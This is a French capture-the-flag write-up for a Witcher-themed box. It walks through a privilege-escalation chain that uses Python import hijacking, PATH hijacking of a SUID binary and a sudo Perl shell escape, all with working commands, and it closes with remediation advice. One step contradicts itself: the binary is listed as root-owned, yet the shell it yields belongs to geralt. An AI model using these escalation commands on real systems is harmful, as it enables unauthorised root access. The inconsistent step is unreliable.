---
author: Paul
date: 2026-10-06
version: 1.0.0
modification: Harmonisation du write-up
cve: Aucun CVE produit applicable ; CWE-427 et CWE-426
---

# Élévation de privilèges

## 1 / Passage de `jaskier` à `yen`

Après avoir récupéré les identifiants de `jaskier`, on se connecte en SSH :

```bash
ssh jaskier@<IP>
```

On vérifie les permissions sudo :

```bash
sudo -l
```

On obtient :

```text
User jaskier may run the following commands on the_continent:
    (yen) /usr/bin/python3 /home/jaskier/toss-a-coin.py
```

Cela signifie que `jaskier` peut exécuter précisément le script `toss-a-coin.py` avec l'utilisateur `yen`.

On regarde le contenu du script :

```bash
cat /home/jaskier/toss-a-coin.py
```

Le script importe notamment le module Python `random` :

```python
import random
```

Puis utilise ce module pour choisir aléatoirement des lignes de la chanson.

Le script lui-même appartient à `root` et n'est pas modifiable par `jaskier` :

```text
-rw-r--r-- 1 root root 1430 Aug 27 09:42 /home/jaskier/toss-a-coin.py
```

Cependant, le mécanisme d'import de Python peut être exploité.

### Hijacking du module Python

Lorsqu'un script Python est exécuté, son répertoire peut être ajouté au chemin de recherche des modules.

On crée donc un faux module `random.py` contrôlé par `jaskier`, contenant du code permettant d'obtenir un shell.

Après avoir placé ce fichier dans un emplacement approprié, on exécute :

```bash
sudo -u yen /usr/bin/python3 /home/jaskier/toss-a-coin.py
```

Le faux `random.py` est alors chargé par Python à la place du module légitime.

On obtient ainsi un shell avec l'utilisateur :

```text
uid=1002(yen) gid=1002(yen) groups=1002(yen)
```

On est donc passé de :

```text
jaskier → yen
```

---

## 2 / Énumération en tant que `yen`

Une fois connecté avec `yen`, on regarde le contenu de son répertoire personnel :

```bash
ls -la
```

On découvre un binaire nommé `portal` :

```text
-rwsr-sr-x 1 root root 16872 Aug 27 09:42 portal
```

Le `s` dans :

```text
-rwsr-sr-x
```

indique que le fichier possède le bit **SUID**.

Le propriétaire du binaire étant `root`, le programme s'exécute avec les privilèges de `root`.

On examine le binaire avec `strings` :

```bash
strings portal
```

Parmi les chaînes intéressantes, on trouve :

```text
I am preparing a portal for you Geralt.
/bin/echo -n 'It will be ready in about ' && date --date='next hour' -R
You just have to wait for it
```

On remarque surtout l'utilisation de :

```text
date
```

sans chemin absolu.

Le programme utilise donc probablement `system()` pour exécuter une commande contenant `date`.

---

## 3 / Exploitation du PATH

Le binaire utilise :

```text
system
```

et exécute :

```text
date --date='next hour' -R
```

Comme `date` n'est pas appelé avec un chemin absolu comme :

```text
/usr/bin/date
```

le shell va rechercher `date` dans les différents répertoires présents dans la variable `PATH`.

On peut donc créer notre propre programme nommé `date`.

On crée le fichier :

```bash
nano /tmp/date
```

Avec le contenu :

```bash
#!/bin/bash
/bin/bash -p
```

Puis on le rend exécutable :

```bash
chmod +x /tmp/date
```

On place ensuite `/tmp` en première position dans le `PATH` :

```bash
export PATH=/tmp:$PATH
```

On vérifie que notre fichier est maintenant prioritaire :

```bash
which date
```

Résultat :

```text
/tmp/date
```

On exécute ensuite le binaire SUID :

```bash
./portal
```

Le programme appelle `date`, mais au lieu d'utiliser `/usr/bin/date`, il exécute notre fichier :

```text
/tmp/date
```

Notre script lance alors :

```bash
/bin/bash -p
```

Le shell obtenu est finalement celui de l'utilisateur `geralt` :

```text
geralt@the_continent:~$
```

On vérifie notre identité :

```bash
id
```

Résultat :

```text
uid=1003(geralt) gid=1002(yen) groups=1002(yen)
```

On a donc maintenant :

```text
jaskier → yen → geralt
```

---

## 4 / Passage de `geralt` à `root`

Une fois connecté en tant que `geralt`, on vérifie les permissions sudo :

```bash
sudo -l
```

On obtient :

```text
User geralt may run the following commands on the_continent:
    (root) NOPASSWD: /usr/bin/perl
```

Cela signifie que `geralt` peut exécuter `/usr/bin/perl` en tant que `root` sans avoir besoin de mot de passe.

Perl permet d'exécuter directement une commande système. On peut donc lancer un shell :

```bash
sudo perl -e 'exec "/bin/sh"'
```

On vérifie ensuite notre identité :

```bash
id
```

Résultat :

```text
uid=0(root) gid=0(root) groups=0(root)
```

Nous sommes maintenant `root`.

---

## 5 / Récupération du `root.txt`

On se place dans le répertoire personnel de `root` :

```bash
cd ~
```

Puis :

```bash
ls -la
```

Le fichier `root.txt` est présent.

On récupère son contenu :

```bash
cat root.txt
```

Le flag obtenu est :

```text
EPI{D3s71Ny_1s_Ju5t_Th3_3mB0D1m3Nt_0f_Th3_S0uL_S_D3s1R3_T0_Gr0W}
```

---

# Résumé de l'exploitation

```text
                    ┌──────────────────────────────┐
                    │          HTTP                 │
                    │ "Toss a coin to your Witcher"│
                    └──────────────┬───────────────┘
                                   │
                                   ▼
                         Identifiants jaskier
                                   │
                                   ▼
                         ┌─────────────────┐
                         │     jaskier     │
                         └────────┬────────┘
                                  │
                       sudo → yen + Python
                                  │
                                  ▼
                     Python import hijacking
                                  │
                                  ▼
                         ┌─────────────────┐
                         │       yen       │
                         └────────┬────────┘
                                  │
                           portal SUID root
                                  │
                                  ▼
                         PATH hijacking
                                  │
                                  ▼
                        ┌──────────────────┐
                        │      geralt      │
                        └────────┬─────────┘
                                 │
                       sudo NOPASSWD → perl
                                 │
                                 ▼
                            ┌─────────┐
                            │  root   │
                            └────┬────┘
                                 │
                                 ▼
                              root.txt
```

## Vulnérabilités utilisées

### 1. Python Import Hijacking

Le script Python charge un module depuis son environnement d'exécution. Un fichier `random.py` contrôlé par l'utilisateur peut alors être chargé à la place du module légitime.

### 2. SUID + PATH Hijacking

Le binaire `portal` possède le bit SUID et s'exécute avec les privilèges de `root`.

Il utilise `system()` avec la commande `date` sans chemin absolu :

```text
date --date='next hour' -R
```

En plaçant un faux `date` en priorité dans le `PATH`, on peut faire exécuter notre propre commande avec les privilèges du binaire.

### 3. Sudo NOPASSWD avec Perl

Enfin, `geralt` possède la permission :

```text
geralt ALL = (root) NOPASSWD: /usr/bin/perl
```

Perl permet alors de lancer un shell avec les privilèges de `root`.

## Remédiation

- Ne pas autoriser un utilisateur à exécuter un script Python avec `sudo` si son environnement d'import est contrôlable.
- Utiliser des chemins absolus dans les appels système et nettoyer `PATH` avant l'exécution d'un binaire privilégié.
- Retirer les règles `NOPASSWD` donnant accès à Perl ou à un autre interpréteur généraliste ; préférer un wrapper dédié avec des arguments fixes.
- Retirer les bits SUID/SGID inutiles et vérifier régulièrement les fichiers privilégiés.

## Reproductibilité

Chaque passage de compte est vérifiable avec les sorties de `id`, `sudo -l`, `which date` et les permissions affichées. La chaîne complète peut être rejouée sur une cible de challenge identique en suivant les commandes dans l'ordre.
